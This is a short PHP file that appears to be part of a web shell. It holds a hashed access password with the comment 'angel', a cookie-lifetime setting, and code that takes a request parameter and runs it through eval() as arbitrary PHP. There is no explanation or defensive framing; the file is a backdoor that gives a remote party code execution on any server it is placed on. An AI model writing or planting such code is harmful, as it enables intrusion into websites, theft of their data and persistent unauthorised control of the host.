<?php
$pass  = 'ec38fe2a8497e0a8d6d349b3533038cb'; //angel

// cookie 有效期
$cookielife = 86400;

for ($i=1;$i<=4;$i++) {
	${'p'.$i} = isset($P['p'.$i]) ? $P['p'.$i] : '';
}

$phpcode = trim($p1);
$phpcode = "<?php\n\n{$phpcode}\n\n?>";
eval("?".">$phpcode<?");

exit;
?>